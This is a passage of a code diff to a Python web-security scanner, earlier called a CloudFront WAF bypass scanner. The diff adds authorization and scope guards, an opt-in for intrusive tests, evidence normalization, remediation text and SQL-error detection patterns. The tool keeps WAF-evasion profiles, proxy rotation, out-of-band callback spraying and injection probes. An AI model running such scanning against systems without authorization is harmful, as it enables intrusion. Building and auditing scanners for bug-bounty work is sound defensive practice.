@@ -1,14 +1,17 @@
-"""
-CloudFront WAF Bypass Scanner with Smart Detection and Error Handling
-Comprehensive WAF detection, bypass, and reconnaissance toolkit
-Optimized for speed and accuracy
+"""Blackthorn threat-hunting and bug-bounty web security scanner.
+
+The engine combines endpoint discovery, vulnerability-specific probes,
+configuration auditing, reconnaissance, and proof-carrying result reporting.
 """
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import urllib3
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, urlencode, quote, quote_plus
+from urllib.parse import (
+    urlparse, urlencode, quote, quote_plus, parse_qsl, urlsplit, urlunsplit,
+    urljoin,
+)
 import time
 import hashlib
 import logging
@@ -38,13 +41,13 @@ from .exceptions import (
     InvalidTimeoutError,
 )
 from .error_handler import (
-    safe_request,
     validate_url,
     GracefulErrorHandler,
     retry_on_network_error,
 )
 from .repro import build_curl
 from .techniques_v16 import ExtraTechniques
+from .evidence import analyze_response, public_response, snapshot_response
 
 
 logger = logging.getLogger(__name__)
@@ -542,7 +545,7 @@ SCAN_CATEGORIES = {
     },
     'encoding_obfuscation': {
         'name': 'Encoding & Obfuscation',
-        'description': 'Tests for encoding-based WAF bypass including double encoding, Unicode normalization, case manipulation, and comment injection.',
+        'description': 'Tests parser and normalization differences using double encoding, Unicode, case variation, and comment boundaries.',
         'techniques': [
             '_test_encoding_bypass',
             '_test_double_encoding',
@@ -976,15 +979,15 @@ class _AdaptiveLimiter:
 
 
 class CloudFrontBypasser(ExtraTechniques):
-    """Optimized WAF Bypass Scanner with connection pooling and smart detection"""
+    """Blackthorn web-security scanner with matched controls and proof oracles."""
     
     # Class-level session pool for connection reuse
     _session_pool: Dict[str, requests.Session] = {}
     _session_lock = threading.Lock()
     
-    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None, auth: dict = None, oob=None, impersonate: Optional[str] = None, scope: dict = None, safe_mode: bool = False, jitter: float = 0.0, proxy_pool: list = None, seed_targets: list = None):
+    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None, auth: dict = None, oob=None, impersonate: Optional[str] = None, scope: dict = None, safe_mode: bool = False, jitter: float = 0.0, proxy_pool: list = None, seed_targets: list = None, intrusive: bool = False, authorization_patterns: list = None):
         """
-        Initialize CloudFront WAF Bypasser
+        Initialize the Blackthorn scanner.
 
         Args:
             target: Target URL to scan
@@ -1095,7 +1098,13 @@ class CloudFrontBypasser(ExtraTechniques):
         self.scope = scope or {}
         self._scope_inc = [_re.compile(p, _re.I) for p in (self.scope.get('include') or [])]
         self._scope_exc = [_re.compile(p, _re.I) for p in (self.scope.get('exclude') or [])]
+        # Scope narrows work; only the engagement allowlist grants active access
+        # to a related host or another origin.
+        self.authorization_patterns = list(authorization_patterns or [])
         self.safe_mode = safe_mode
+        # Stateful workflow guesses (uploads, transfers, emails, cache poison)
+        # require a separate, explicit opt-in even outside safe mode.
+        self.intrusive = bool(intrusive)
         self.jitter = max(0.0, float(jitter or 0.0))
         self.proxy_pool = list(proxy_pool) if proxy_pool else []
         # Endpoints seeded from imported traffic (HAR/Postman/Burp); merged into
@@ -1117,6 +1126,10 @@ class CloudFrontBypasser(ExtraTechniques):
 
         # Response cache to avoid duplicate requests
         self._response_cache: Dict[str, Dict] = {}
+        # Matched benign controls are cached separately from probe verdicts.
+        # This keeps a normal endpoint response from being compared to GET / and
+        # avoids re-fetching the same clean request for every payload variant.
+        self._control_cache: Dict[str, Dict[str, Any]] = {}
         self._cache_lock = threading.Lock()
         
         # Parse target
@@ -1140,6 +1153,20 @@ class CloudFrontBypasser(ExtraTechniques):
         self._session = self._get_optimized_session()
         self._apply_evasion_profile()
         self._apply_auth()
+        # Passive third-party lookups must never inherit target cookies, bearer
+        # tokens, Basic auth, or custom API-key headers from the scan session.
+        self._recon_session = requests.Session()
+        self._recon_session.headers.update({
+            'User-Agent': 'Blackthorn passive security research client',
+            'Accept': 'application/json,text/plain,*/*',
+        })
+        if self.proxy_config:
+            proxy_type = self.proxy_config.get('type', 'http')
+            proxy_host = self.proxy_config.get('host', '127.0.0.1')
+            proxy_port = self.proxy_config.get('port', 8080)
+            scheme = 'socks5h' if proxy_type in ('socks5', 'socks5h') else 'http'
+            proxy_url = f"{scheme}://{proxy_host}:{proxy_port}"
+            self._recon_session.proxies = {'http': proxy_url, 'https': proxy_url}
 
         logger.info(f"Initialized scanner for {self.target}")
 
@@ -1149,6 +1176,48 @@ class CloudFrontBypasser(ExtraTechniques):
         '_test_integer_overflow', '_test_range_header_attacks', '_test_http_desync',
         '_test_smuggling_cl0', '_test_multipart_bypass', '_test_graphql_deep_testing',
         '_test_websocket_fuzzing',
+        # State-changing or potentially destructive guesses.  These require an
+        # explicitly active scan rather than the safe-mode transport contract.
+        '_test_mass_assignment', '_test_business_logic_flaws',
+        '_test_email_header_injection', '_test_file_upload_bypass',
+        '_test_pdf_injection', '_test_content_sniffing',
+        '_test_verb_tampering_extended', '_test_llm_prompt_injection',
+        '_test_auth_logic', '_test_prototype_pollution',
+        '_test_deserialization', '_test_json_injection', '_test_xslt_injection',
+        '_test_xxe_detection', '_test_ssi_injection', '_test_log4shell_patterns',
+        '_test_time_based_detection', '_test_ssrf_protocol_smuggling',
+        '_test_cloud_metadata_v2', '_test_oob_interactions',
+        '_test_cache_poisoning', '_test_web_cache_deception',
+        '_test_path_traversal_bypass',
+    }
+
+    INTRUSIVE_WORKFLOW_SKIP = {
+        '_test_race_condition', '_test_single_packet_race',
+        '_test_mass_assignment', '_test_business_logic_flaws',
+        '_test_email_header_injection', '_test_file_upload_bypass',
+        '_test_pdf_injection', '_test_host_header_attacks',
+        '_test_cache_poisoning', '_test_cache_poisoning_deep',
+        '_test_web_cache_deception', '_test_graphql_deep_testing',
+        '_test_ssrf_protocol_smuggling', '_test_cloud_metadata_v2',
+        '_test_cloud_metadata_enumeration', '_test_ssrf_bypass',
+        '_test_dns_rebinding', '_test_auth_logic',
+        '_test_content_sniffing', '_test_verb_tampering_extended',
+        '_test_llm_prompt_injection',
+    }
+
+    # These checks cannot be implemented faithfully through Requests because it
+    # normalizes ambiguous framing. Disable them instead of reporting fabricated
+    # smuggling/desynchronization evidence.
+    DISABLED_TRANSPORT_TECHNIQUES = {
+        '_test_transfer_encoding_smuggling', '_test_chunked_transfer',
+        '_test_request_smuggling_v2', '_test_http2_specific_attacks',
+        '_test_http_desync', '_test_smuggling_cl0', '_test_single_packet_race',
+    }
+
+    # Kept visible in the catalog, but disabled because the current probe cannot
+    # produce the state transition needed to prove the vulnerability.
+    DISABLED_ACCURACY_TECHNIQUES = {
+        '_test_dns_rebinding',
     }
 
     def _in_scope(self, url: str) -> bool:
@@ -1161,6 +1230,90 @@ class CloudFrontBypasser(ExtraTechniques):
         if self._scope_inc and not any(p.search(url) for p in self._scope_inc):
             return False
         return True
+
+    def _scoped_safe_request(self, url: str, method: str = 'GET', **kwargs):
+        """Unified request boundary for legacy/direct scanners.
+
+        Target-origin requests use the authenticated scan session. Other origins
+        use the sterile recon session, so cookies/API keys never leave the target.
+        Redirects are followed only while they remain on the same allowed origin.
+        """
+        if not url:
+            return None
+        url = str(url)
+        passive_lookup = bool(kwargs.pop('passive_lookup', False))
+        is_target = self._same_target_origin(url)
+        if is_target and not self._in_scope(url):
+            logger.debug(f"Request blocked by scope: {url}")
+            return None
+        if not is_target and not passive_lookup:
+            try:
+                from .authorization import is_authorized
+                authorized = bool(
+                    self.authorization_patterns
+                    and is_authorized(url, self.authorization_patterns)
+                )
+            except Exception:
+                authorized = False
+            if not authorized:
+                logger.debug(f"Related/external active request blocked by authorization: {url}")
+                return None
+            if not self._in_scope(url):
+                logger.debug(f"Related/external request blocked by scope: {url}")
+                return None
+
+        session = self._session if is_target else getattr(self, '_recon_session', None)
+        if session is None:
+            session = requests.Session()
+        wanted_redirects = bool(kwargs.pop('allow_redirects', False))
+        kwargs.setdefault('timeout', self.timeout)
+        kwargs.setdefault('verify', False)
+        current = url
+        response = None
+        try:
+            for _ in range(6):
+                response = session.request(
+                    method=method, url=current, allow_redirects=False, **kwargs
+                )
+                if not wanted_redirects or response is None or response.status_code not in (
+                    301, 302, 303, 307, 308
+                ):
+                    return response
+                location = response.headers.get('Location')
+                if not location:
+                    return response
+                following = urljoin(current, location)
+                if not self._same_target_origin(following) and is_target:
+                    logger.debug(f"Stopped credentialed redirect at origin boundary: {following}")
+                    return response
+                if not is_target and not self._same_origin(current, following):
+                    logger.debug(f"Stopped external redirect at origin boundary: {following}")
+                    return response
+                if not self._in_scope(following):
+                    logger.debug(f"Stopped redirect at scope boundary: {following}")
+                    return response
+                current = following
+                if response.status_code == 303:
+                    method = 'GET'
+                    kwargs.pop('data', None)
+                    kwargs.pop('json', None)
+            return response
+        except Exception as exc:
+            logger.debug(f"Scoped request failed for {method} {url}: {exc}")
+            return None
+
+    @staticmethod
+    def _same_origin(left: str, right: str) -> bool:
+        """Compare scheme, hostname, and effective port for absolute URLs."""
+        try:
+            def origin(value):
+                parsed = urlparse(value)
+                scheme = parsed.scheme.lower()
+                port = parsed.port or (443 if scheme == 'https' else 80)
+                return scheme, (parsed.hostname or '').lower(), port
+            return origin(left) == origin(right)
+        except Exception:
+            return False
 
     def _apply_auth(self) -> None:
         """Apply authenticated-scanning settings to the session so EVERY request
@@ -1208,13 +1361,16 @@ class CloudFrontBypasser(ExtraTechniques):
         """Execute a login request and keep the resulting session cookies."""
         try:
             method = (login.get('method') or 'POST').upper()
-            url = login['url']
+            url = urljoin(f"{self.target}/", str(login['url']))
+            if not self._same_target_origin(url) or not self._in_scope(url):
+                print("[!] Login URL must remain inside the authorized target origin and scope")
+                return False
             kwargs = {'timeout': self.timeout, 'verify': False, 'allow_redirects': True}
             if login.get('json') is not None:
                 kwargs['json'] = login['json']
             elif login.get('data') is not None:
                 kwargs['data'] = login['data']
-            resp = self._session.request(method, url, **kwargs)
+            resp = self._scoped_safe_request(url, method=method, **kwargs)
             success = login.get('success')
             ok = True
             if success and resp is not None:
@@ -1323,11 +1479,18 @@ class CloudFrontBypasser(ExtraTechniques):
 
         session = requests.Session()
         
-        # Configure retry strategy
+        # Retry transport failures, never HTTP status codes. A 500/502/503 body
+        # can be the detector-specific evidence we need, and automatic status
+        # retries previously discarded it behind MaxRetryError (while also
+        # tripling intrusive requests).
         retry_strategy = Retry(
             total=2,
+            connect=2,
+            read=2,
+            status=0,
             backoff_factor=0.3,
-            status_forcelist=[500, 502, 503, 504],
+            status_forcelist=[],
+            raise_on_status=False,
         )
         
         # Mount adapters with connection pooling
@@ -1431,7 +1594,7 @@ class CloudFrontBypasser(ExtraTechniques):
         print("[*] Establishing baseline...")
         try:
             baseline = self._get_baseline()
-            if not baseline:
+            if baseline is None:
                 raise BaselineFailedError(
                     "Failed to establish baseline - target may be down",
                     details={'target': self.target}
@@ -1518,11 +1681,13 @@ class CloudFrontBypasser(ExtraTechniques):
 
         # OOB: spray blind-vuln callbacks early so the rest of the scan serves as
         # the wait window; interactions are collected after the techniques run.
-        if self.oob:
+        if self.oob and not self.safe_mode:
             try:
                 self._oob_spray()
             except Exception as e:
                 logger.debug(f"OOB spray error: {e}")
+        elif self.oob and self.safe_mode:
+            print("[*] Safe mode: skipped active out-of-band callback probes")
 
         print("\n[*] Phase 3: Testing bypass techniques...")
         
@@ -1700,6 +1865,34 @@ class CloudFrontBypasser(ExtraTechniques):
             except Exception as e:
                 logger.debug(f"Feedback reorder error: {e}")
 
+        # Do not run checks the current engines cannot express or prove.
+        disabled_names = (
+            self.DISABLED_TRANSPORT_TECHNIQUES
+            | self.DISABLED_ACCURACY_TECHNIQUES
+        )
+        before = len(techniques)
+        techniques = [
+            technique for technique in techniques
+            if getattr(technique, '__name__', '') not in disabled_names
+        ]
+        disabled = before - len(techniques)
+        if disabled:
+            print(f"[*] Accuracy guard: disabled {disabled} technique(s) that "
+                  "require a specialized proof-capable engine")
+
+        # Guessed state-changing workflows are never implicit. An authorization
+        # allowlist controls scope; --intrusive separately controls impact.
+        if not self.intrusive:
+            before = len(techniques)
+            techniques = [
+                technique for technique in techniques
+                if getattr(technique, '__name__', '') not in self.INTRUSIVE_WORKFLOW_SKIP
+            ]
+            skipped = before - len(techniques)
+            if skipped:
+                print(f"[*] Intrusive workflow guard: skipped {skipped} technique(s); "
+                      "use --intrusive only with explicit impact authorization")
+
         # Safe mode: drop noisy / DoS-flavored / state-changing techniques.
         if self.safe_mode:
             before = len(techniques)
@@ -1821,6 +2014,10 @@ class CloudFrontBypasser(ExtraTechniques):
             except Exception as e:
                 logger.debug(f"Re-confirmation phase error: {e}")
 
+        # Bring direct/legacy scanner records onto the same explicit state model
+        # as the evidence-aware request path before they reach GUI/export/CI.
+        self._normalize_result_records()
+
         # Backfill reproduction commands for any results built outside the
         # _test_request chokepoint (recon/audit/cloud findings).
         self._attach_repro_commands()
@@ -1840,7 +2037,9 @@ class CloudFrontBypasser(ExtraTechniques):
             except Exception:
                 pass
 
-        logger.info(f"Scan complete: Found {len(self.results)} bypasses")
+        actionable_count = sum(1 for r in self.results if _is_actionable_result(r))
+        logger.info(f"Scan complete: {actionable_count} actionable findings, "
+                    f"{len(self.results) - actionable_count} observations")
         return self.results
 
     @staticmethod
@@ -1907,24 +2106,58 @@ class CloudFrontBypasser(ExtraTechniques):
             path = r.get('path', '/')
             headers = r.get('headers') if isinstance(r.get('headers'), dict) else {}
             data = r.get('data')
+            expected_detector = str(r.get('detector_id') or '')
+            expected_signals = {
+                str(item.get('type')) for item in (r.get('evidence') or [])
+                if isinstance(item, dict) and item.get('type')
+            }
+            originally_confirmed = (
+                str(r.get('verification_status') or '').lower() == 'confirmed'
+            )
             confirmed = 0
             for _ in range(samples):
                 try:
                     replay = self._test_request(
                         dict(headers), method=method, path=path,
                         technique=r.get('technique'), data=data, use_cache=False,
+                        probe=dict(r.get('probe') or {}),
                     )
                 except Exception:
                     replay = None
-                if replay and replay.get('bypass'):
+                if not replay or not replay.get('bypass'):
+                    continue
+                replay_detector = str(replay.get('detector_id') or '')
+                replay_signals = {
+                    str(item.get('type')) for item in (replay.get('evidence') or [])
+                    if isinstance(item, dict) and item.get('type')
+                }
+                same_detector = (
+                    not expected_detector or replay_detector == expected_detector
+                )
+                same_signal = not expected_signals or bool(
+                    expected_signals & replay_signals
+                )
+                same_strength = (
+                    not originally_confirmed
+                    or str(replay.get('verification_status') or '').lower() == 'confirmed'
+                )
+                if same_detector and same_signal and same_strength:
                     confirmed += 1
             ratio = (confirmed / samples) if samples else 0.0
             r['confirmations'] = f"{confirmed}/{samples}"
             if ratio >= keep_threshold:
-                r['confidence'] = 'high' if ratio == 1.0 else 'medium'
+                # Repetition cannot turn a generic content-delta candidate into
+                # detector-specific proof. Preserve the original verification
+                # state while recording stability separately.
+                if r.get('verification_status') == 'confirmed':
+                    r['confidence'] = 'high' if ratio == 1.0 else 'medium'
+                else:
+                    r['confidence'] = 'medium' if ratio == 1.0 else 'low'
             else:
                 r['bypass'] = False
                 r['confidence'] = 'low'
+                r['verification_status'] = 'unconfirmed'
+                r['kind'] = 'suspected'
                 r['reason'] = f"Unconfirmed (reproduced {confirmed}/{samples}): {r.get('reason', '')}"
                 demoted += 1
         if demoted:
@@ -2032,6 +2265,9 @@ class CloudFrontBypasser(ExtraTechniques):
                            f"({where}); source={ix.source or '?'}"),
                 'severity': 'CRITICAL', 'category': 'OOB',
                 'confidence': 'high', 'confirmations': 'oob', '_no_reconfirm': True,
+                '_no_repro': True,
+                'request': {'available': False,
+                            'note': 'OOB proof is correlated to a prior callback probe'},
                 'oob': {'protocol': ix.protocol, 'source': ix.source,
                         'raw': ix.raw, 'timestamp': ix.timestamp, 'full_id': ix.full_id},
             })
@@ -2061,7 +2297,9 @@ class CloudFrontBypasser(ExtraTechniques):
         except Exception:
             base_headers = {}
         for r in self.results:
-            if not isinstance(r, dict) or r.get('curl'):
+            if (not isinstance(r, dict) or r.get('curl') or r.get('_no_repro')
+                    or (isinstance(r.get('request'), dict)
+                        and r['request'].get('available') is False)):
                 continue
             path = r.get('path', '/') or '/'
             if path.startswith('http://') or path.startswith('https://'):
@@ -2076,6 +2314,144 @@ class CloudFrontBypasser(ExtraTechniques):
                 r['curl'] = build_curl(r.get('method', 'GET'), url, merged, r.get('data'))
             except Exception:
                 pass
+
+    @staticmethod
+    def _default_remediation(result: Dict[str, Any]) -> str:
+        haystack = f"{result.get('category', '')} {result.get('technique', '')}".lower()
+        if any(k in haystack for k in ('sqli', 'sql injection', 'nosql', 'ldap')):
+            return ('Use parameterized queries or safe query builders, validate input by schema, '
+                    'and return generic parser errors to clients.')
+        if any(k in haystack for k in ('xss', 'dangling', 'css injection')):
+            return ('Apply context-aware output encoding, sanitize permitted markup, and enforce '
+                    'a restrictive Content Security Policy as defense in depth.')
+        if any(k in haystack for k in ('command injection', 'cmdinj', 'ssi')):
+            return ('Avoid shell interpretation; invoke fixed executables with argument arrays and '
+                    'strict allowlists under a least-privileged account.')
+        if any(k in haystack for k in ('traversal', 'lfi', 'file inclusion')):
+            return ('Resolve paths against a fixed base directory, reject traversal after '
+                    'canonicalization, and use server-side file identifiers.')
+        if any(k in haystack for k in ('ssti', 'template')):
+            return ('Never render user-controlled text as a template; pass it as data and use a '
+                    'sandboxed template environment with dangerous globals removed.')
+        if any(k in haystack for k in ('xxe', 'xml')):
+            return ('Disable DTD/external-entity and XInclude resolution in every XML parser, and '
+                    'restrict parser network/file access.')
+        if 'crlf' in haystack or 'response splitting' in haystack:
+            return ('Reject CR/LF in header-bound input and use framework header APIs that prevent '
+                    'raw response-header construction.')
+        if 'prototype' in haystack:
+            return ('Reject __proto__/constructor/prototype keys recursively and use null-prototype '
+                    'maps or patched object-merge libraries.')
+        if 'deserial' in haystack:
+            return ('Do not deserialize untrusted native objects; use a typed data format, integrity '
+                    'protection, and an explicit class allowlist.')
+        return ('Verify the affected request, then constrain the trusted input boundary and add a '
+                'regression test for the demonstrated behavior.')
+
+    def _normalize_result_records(self) -> None:
+        """Backfill canonical state/evidence fields on every scanner record."""
+        observation_categories = {
+            'WAF_DETECTION', 'CDN_DETECTION', 'OS_DETECTION', 'API_DISCOVERY',
+            'TECH_STACK', 'CT_LOGS', 'SUBDOMAIN_ENUM', 'JSON_INJECTION',
+        }
+        for result in self.results:
+            if not isinstance(result, dict):
+                continue
+            details = result.get('details') if isinstance(result.get('details'), dict) else {}
+            exact_request_known = bool(
+                (isinstance(result.get('request'), dict)
+                 and (result['request'].get('url') or result['request'].get('path')))
+                or result.get('path') or result.get('url') or details.get('endpoint')
+            )
+            result.setdefault('target', self.target)
+            result.setdefault('title', result.get('technique') or 'Blackthorn result')
+            if not result.get('payload') and details.get('payload') is not None:
+                result['payload'] = details.get('payload')
+            result.setdefault('payload', '')
+            result.setdefault('method', 'GET')
+            if not result.get('path') and details.get('endpoint'):
+                endpoint = str(details.get('endpoint'))
+                result['path'] = (urlsplit(endpoint).path or '/') if endpoint.startswith(
+                    ('http://', 'https://')
+                ) else endpoint
+            result.setdefault('path', '/' if exact_request_known else '')
+            path = str(result.get('path') or '/')
+            result.setdefault(
+                'url', path if path.startswith(('http://', 'https://')) else self._path_url(path)
+            )
+            if exact_request_known:
+                result.setdefault('request', {
+                    'method': result.get('method', 'GET'), 'url': result.get('url'),
+                    'path': path, 'headers': dict(result.get('headers') or {}),
+                    'body': result.get('data'),
+                })
+            else:
+                result.setdefault('request', {
+                    'available': False,
+                    'note': 'Legacy detector did not record the exact request',
+                })
+                result['_no_repro'] = True
+            result.setdefault('response', {
+                'status': result.get('status', result.get('response_code', 0)),
+                'size': result.get('size', 0), 'content_type': '',
+                'headers': {}, 'excerpt': '',
+            })
+
+            category = str(result.get('category') or 'OTHER').upper()
+            if not result.get('kind'):
+                if category in observation_categories or not result.get('bypass'):
+                    result['kind'] = 'observation'
+                    result.setdefault('verification_status', 'informational')
+                    result.setdefault('confidence', 'high' if category in observation_categories else 'none')
+                elif result.get('oob') or result.get('confirmations') == 'oob':
+                    result['kind'] = 'finding'
+                    result['verification_status'] = 'confirmed'
+                    result['confidence'] = 'high'
+                else:
+                    # Stable replay is useful, but repeating a legacy heuristic
+                    # cannot turn it into vulnerability-specific proof.
+                    result['kind'] = 'suspected'
+                    result.setdefault('verification_status', 'candidate')
+                    result.setdefault('confidence', 'medium')
+            result.setdefault('verification_status', 'not_detected')
+            result.setdefault('confidence', 'none')
+            result.setdefault('evidence', [{
+                'type': 'legacy_detector_signal',
+                'description': str(result.get('reason') or ''),
+                'matched': '', 'excerpt': '',
+            }] if result.get('reason') else [])
+            result.setdefault('remediation', self._default_remediation(result))
+            result.setdefault('observed_at', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+
+            if not result.get('fingerprint'):
+                insertion = result.get('insertion_point') or {}
+                family = str(result.get('technique') or '').split(':', 1)[0].lower()
+                material = '|'.join([
+                    urlparse(self.target).netloc.lower(), str(result.get('method', 'GET')),
+                    urlsplit(path).path or '/', category,
+                    str(insertion.get('type', '') if isinstance(insertion, dict) else insertion),
+                    str(insertion.get('name', '') if isinstance(insertion, dict) else ''),
+                    family,
+                ])
+                result['fingerprint'] = hashlib.sha256(material.encode()).hexdigest()[:24]
+            result.setdefault('finding_id', f"bt-{result['fingerprint']}")
+
+        # Negative wire probes belong in debug/HTTP telemetry, not in a security
+        # report. Keep meaningful informational observations (technology,
+        # headers, discovered assets) while pruning canonical no-signal/rejected
+        # transactions from the user-facing result collection.
+        self.results[:] = [
+            result for result in self.results
+            if not (
+                isinstance(result, dict)
+                and result.get('kind') == 'observation'
+                and any(
+                    isinstance(item, dict)
+                    and item.get('type') in {'no_signal', 'rejected'}
+                    for item in (result.get('evidence') or [])
+                )
+            )
+        ]
 
     def _run_plugins(self) -> None:
         """Execute user-supplied bypass plugins as a scan phase.
@@ -2099,7 +2475,10 @@ class CloudFrontBypasser(ExtraTechniques):
                 for norm in self._normalize_plugin_results(plugin, outcome):
                     self.results.append(norm)
                     if norm.get('bypass'):
-                        print(f"  [✓] PLUGIN BYPASS: {norm['technique']} | {norm['reason']} | {norm['severity']}")
+                        confirmed = str(norm.get('verification_status') or '').lower() == 'confirmed'
+                        label = 'PLUGIN FINDING' if confirmed else 'PLUGIN CANDIDATE'
+                        print(f"  [{'✓' if confirmed else '!'}] {label}: "
+                              f"{norm['technique']} | {norm['reason']} | {norm['severity']}")
             except Exception as e:
                 logger.debug(f"Plugin '{getattr(plugin, 'name', '?')}' failed: {e}")
 
@@ -2112,18 +2491,26 @@ class CloudFrontBypasser(ExtraTechniques):
         for item in items:
             if not isinstance(item, dict):
                 continue
-            normalized.append({
-                'bypass': bool(item.get('bypass', item.get('success', False))),
-                'status': item.get('status', 0),
-                'headers': item.get('headers', {}),
-                'method': item.get('method', 'GET'),
-                'path': item.get('path', '/'),
-                'size': item.get('size', 0),
-                'technique': item.get('technique', f"Plugin: {getattr(plugin, 'name', 'custom')}"),
-                'reason': item.get('reason', item.get('message', 'Plugin result')),
-                'severity': item.get('severity', 'INFO'),
-                'category': item.get('category', 'PLUGIN'),
-            })
+            norm = dict(item)
+            norm['bypass'] = bool(item.get('bypass', item.get('success', False)))
+            norm.setdefault('status', 0)
+            norm.setdefault('headers', {})
+            norm.setdefault('method', 'GET')
+            norm.setdefault('size', 0)
+            norm.setdefault(
+                'technique', f"Plugin: {getattr(plugin, 'name', 'custom')}"
+            )
+            norm.setdefault('reason', item.get('message', 'Plugin result'))
+            norm.setdefault('severity', 'INFO')
+            norm.setdefault('category', 'PLUGIN')
+            if norm['bypass'] and not norm.get('verification_status'):
+                norm['verification_status'] = 'candidate'
+                norm.setdefault('kind', 'suspected')
+                norm.setdefault('confidence', 'medium')
+            elif not norm['bypass']:
+                norm.setdefault('verification_status', 'informational')
+                norm.setdefault('kind', 'observation')
+            normalized.append(norm)
         return normalized
 
     def _run_discovery(self) -> None:
@@ -2137,11 +2524,21 @@ class CloudFrontBypasser(ExtraTechniques):
         def _merge(items):
             for ep in items or []:
                 path = ep.get('path') or '/'
-                params = ep.get('params') or {}
+                # Older/imported entries may still carry a query in ``path``.
+                # Normalize it once and merge those values without duplicating ?.
+                parsed_path = urlsplit(path)
+                path = parsed_path.path or '/'
+                incoming_params = dict(ep.get('params') or {})
+                params = dict(parse_qsl(parsed_path.query, keep_blank_values=True))
+                params.update(incoming_params)
                 method = ep.get('method', 'GET')
                 key = f"{method}:{path}:{','.join(sorted(params.keys()))}"
                 if key not in discovered:
-                    discovered[key] = {'path': path, 'params': dict(params), 'method': method}
+                    discovered[key] = {
+                        'path': path, 'params': dict(params), 'method': method,
+                        'headers': dict(ep.get('headers') or {}),
+                        'body': ep.get('body'), 'url': ep.get('url'),
+                    }
 
         # Seed from imported traffic first (HAR/Postman/Burp).
         if self.seed_targets:
@@ -2198,7 +2595,9 @@ class CloudFrontBypasser(ExtraTechniques):
 
     def _fuzz_param_endpoints(self, payloads: List[str], technique_prefix: str,
                               category: str = None, max_endpoints: int = 15,
-                              max_payloads: int = 8) -> List[Dict[str, Any]]:
+                              max_payloads: int = 8,
+                              oracle: Optional[Dict[str, Any]] = None,
+                              detector_id: Optional[str] = None) -> List[Dict[str, Any]]:
         """Inject ``payloads`` into each discovered parameter and batch-test.
 
         For every discovered GET endpoint, each parameter is fuzzed in turn while
@@ -2214,10 +2613,26 @@ class CloudFrontBypasser(ExtraTechniques):
             for pname in params:
                 for payload in payloads[:max_payloads]:
                     inj = build_injection_path(path, params, pname, payload)
+                    control_path = build_injection_path(
+                        path, params, pname, params.get(pname, 'blackthorn-control')
+                    )
+                    oracle_spec = dict(oracle or {})
+                    if oracle_spec.get('value') == '$PAYLOAD':
+                        oracle_spec['value'] = payload
+                    if oracle_spec.get('type') == 'marker':
+                        oracle_spec.setdefault('payload', payload)
                     test_cases.append({
                         'headers': {},
                         'path': inj,
                         'technique': f'{technique_prefix} [{pname}]: {payload[:30]}',
+                        'category': category or 'INJECTION',
+                        'payload': payload,
+                        'parameter': pname,
+                        'insertion_point': {'type': 'query', 'name': pname},
+                        'detector_id': detector_id or 'parameter-differential-v2',
+                        'oracle': oracle_spec or None,
+                        'control': {'method': 'GET', 'path': control_path,
+                                    'headers': {}, 'data': None},
                     })
         results = self._batch_test(test_cases) if test_cases else []
         if category:
@@ -2246,8 +2661,40 @@ class CloudFrontBypasser(ExtraTechniques):
         for cat, label in [('sqli', 'SQLi-mut'), ('xss', 'XSS-mut'),
                            ('ssti', 'SSTI-mut'), ('cmd', 'CmdInj-mut')]:
             payloads = self._pack(cat)
-            results += self._fuzz_param_endpoints(payloads, label, category='INJECTION',
-                                                  max_payloads=6, max_endpoints=10)
+            oracle = None
+            detector = f'{cat}-mutation-differential-v2'
+            if cat == 'sqli':
+                oracle = {
+                    'type': 'regex',
+                    'patterns': [r'you have an error in your sql syntax',
+                                 r'syntax error at or near', r'ora-\d{5}',
+                                 r'unclosed quotation mark'],
+                    'severity': 'HIGH',
+                    'reason': 'Database error appeared only after the mutated SQL probe',
+                }
+            elif cat == 'xss':
+                oracle = {
+                    'type': 'reflection', 'value': '$PAYLOAD', 'severity': 'MEDIUM',
+                    'reason': ('Mutated payload reflected verbatim; browser execution '
+                               'and context are unverified'),
+                }
+            batch = self._fuzz_param_endpoints(
+                payloads, label, category='INJECTION', max_payloads=6,
+                max_endpoints=10, oracle=oracle, detector_id=detector,
+            )
+            # Mutation changes often produce a stable but harmless response
+            # delta.  Only class-specific evidence is promoted here; the
+            # dedicated SSTI and command scanners perform the stronger paired
+            # execution checks for those classes.
+            required_evidence = {
+                'sqli': 'response_signature',
+                'xss': 'unencoded_reflection',
+            }.get(cat)
+            if required_evidence:
+                results.extend(
+                    r for r in batch
+                    if self._result_has_evidence(r, required_evidence)
+                )
         return results
 
     @retry_on_network_error(max_retries=3, backoff_factor=0.5)
@@ -2262,19 +2709,17 @@ class CloudFrontBypasser(ExtraTechniques):
             TargetUnreachableError: If target cannot be reached after retries
         """
         try:
-            # When impersonating, baseline through the same fingerprinted session
-            # so the baseline isn't blocked while probes pass (or vice-versa).
-            if self._impersonating:
-                return self._session.request(
-                    method='GET', url=self.target,
-                    timeout=self.timeout, allow_redirects=False, verify=False,
-                )
-            resp = safe_request(
-                self.target,
-                timeout=self.timeout,
-                allow_redirects=False
+            # The baseline must use the exact authenticated/evasion/proxy session
+            # used by probes.  A logged-out self._scoped_safe_request() baseline compared with
+            # logged-in probes made almost every authenticated page look bypassed.
+            kwargs = dict(
+                method='GET', url=self.target, timeout=self.timeout,
+                allow_redirects=False, verify=False,
             )
-            return resp
+            if self.proxy_pool:
+                proxy = random.choice(self.proxy_pool)
+                kwargs['proxies'] = {'http': proxy, 'https': proxy}
+            return self._session.request(**kwargs)
         except Exception as e:
             logger.error(f"Baseline request failed: {e}")
             raise
@@ -2479,6 +2924,219 @@ class CloudFrontBypasser(ExtraTechniques):
         """Get cached SSL/TLS analysis results"""
         return self._ssl_info if self._ssl_info else self.analyze_ssl_tls()
 
+    @staticmethod
+    def _stable_request_key(method: str, url: str, headers: Dict[str, Any], data: Any,
+                            context: Any = None) -> str:
+        """Stable cache key for a wire request plus its detection context."""
+        material = json.dumps({
+            'method': method.upper(), 'url': url,
+            'headers': sorted((str(k).lower(), str(v)) for k, v in (headers or {}).items()),
+            'data': data, 'context': context,
